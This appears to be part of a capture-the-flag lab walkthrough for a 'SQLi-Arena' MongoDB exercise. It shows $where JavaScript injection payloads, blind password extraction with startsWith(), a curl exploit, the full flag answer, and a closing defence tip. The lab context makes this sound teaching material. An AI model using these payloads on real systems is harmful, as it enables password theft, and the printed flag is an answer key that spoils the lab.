<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>admin<br>
        <span class="prompt">Query: </span>db.users.find({$where: "this.username == 'admin'"})<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Username:</strong> admin: <strong>Email:</strong> admin@nosql-corp.io: <strong>Role:</strong> admin: <strong>Active:</strong> Yes<br>
        <span class="prompt">// Passwords are NOT displayed in search results</span>
    </div>
</div>

<h4>Step 2: Confirm JS Injection</h4>
<p>
    The <code>$where</code> clause evaluates JavaScript. Inject <code>' || 'a'=='a</code>
    to make the expression always true and return all users.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Return All Users</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' || 'a'=='a<br>
        <span class="prompt">Query: </span>db.users.find({$where: "this.username == '' || 'a'=='a'"})<br><br>
        <span class="prompt">Output: </span>3 users returned (all documents match)
    </div>
</div>

<h4>Step 3: Blind Extraction via startsWith()</h4>
<p>
    Use <code>this.password.startsWith('prefix')</code> in the JS expression to test
    whether the admin's password begins with a known prefix. If it matches, the admin
    user appears in results (1 result). If not, no results.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Blind Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' || this.password.startsWith('FLAG') &amp;&amp; this.username=='admin<br>
        <span class="prompt">Output: </span>1 result (admin found -> starts with FLAG)<br><br>
        <span class="prompt">Input: </span>' || this.password.startsWith('WRONG') &amp;&amp; this.username=='admin<br>
        <span class="prompt">Output: </span>0 results (no match)<br><br>
        <span class="prompt">Input: </span>' || this.password.startsWith('FLAG{mg_w') &amp;&amp; this.username=='admin<br>
        <span class="prompt">Output: </span>1 result -> continues with 'w'
    </div>
</div>

<h4>Step 4: Full Extraction</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Extraction Progress</span>
    </div>
    <div class="terminal-body">
        F -> FL -> FLA -> FLAG -> FLAG{ -> FLAG{m -> FLAG{mg -> FLAG{mg_ -><br>
        FLAG{mg_w -> FLAG{mg_wh -> FLAG{mg_wh3 -> FLAG{mg_wh3r -> FLAG{mg_wh3r3 -><br>
        FLAG{mg_wh3r3_ -> FLAG{mg_wh3r3_j -> FLAG{mg_wh3r3_js -> FLAG{mg_wh3r3_js_ -><br>
        FLAG{mg_wh3r3_js_1 -> FLAG{mg_wh3r3_js_1n -> FLAG{mg_wh3r3_js_1nj -><br>
        FLAG{mg_wh3r3_js_1nj3 -> FLAG{mg_wh3r3_js_1nj3c -> FLAG{mg_wh3r3_js_1nj3ct -><br>
        <strong>FLAG{mg_wh3r3_js_1nj3ct}</strong>
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{mg_wh3r3_js_1nj3ct}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mongodb/lab4" \<br> --data-urlencode "search=' || this.password.startsWith('FLAG{mg_wh3r3_js_1nj3ct}') &amp;&amp; this.username=='admin"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MongoDB's <code>$where</code> clause evaluates JavaScript
    expressions server-side. If user input is concatenated into the expression, it enables full
    JavaScript injection: far more powerful than operator injection. Attackers can use
    <code>this.password.startsWith()</code>, <code>this.password[N]=='X'</code>, or even
    <code>sleep()</code> for time-based extraction. Defense: never use <code>$where</code> with
    user input. In MongoDB 4.4+, <code>$where</code> is deprecated in favor of
    <code>$expr</code> with aggregation operators that don't execute arbitrary JS.
</div>
